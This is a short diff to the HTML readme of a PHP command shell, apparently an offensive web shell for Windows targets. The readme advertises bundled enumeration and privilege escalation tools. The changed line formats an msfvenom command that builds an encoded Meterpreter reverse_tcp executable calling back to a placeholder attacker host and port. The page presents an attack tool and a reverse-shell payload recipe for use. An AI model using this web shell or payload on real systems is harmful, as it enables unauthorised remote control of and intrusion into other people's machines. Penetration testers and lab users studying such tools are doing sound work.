@@ -1,7 +1,7 @@
 <h1> The Not-So Simple PHP Command Shell</h1>
 <img src="/img/nsscmdshell.png" />
 <p>Automates many on target functions. Designed for windows targets. It isn't pretty, but it works as intended. I have included an assortment of common windows enumeration and escalation tools.  To generate your own msfvenom payload:<br> 
-venom.exe : (sudo) msfvenom -p windows/meterpreter/reverse_tcp LHOST=(ATTACKBOXIP) LPORT=(ATTACBOXPORT) -e x64/shikata_ga_nai -f exe -o venom.exe <br>
+venom.exe : <code>sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=(ATTACKBOXIP) LPORT=(ATTACBOXPORT) -e x64/shikata_ga_nai -f exe -o venom.exe</code>
 </p>
 
 <img src="https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshelluse.gif" />
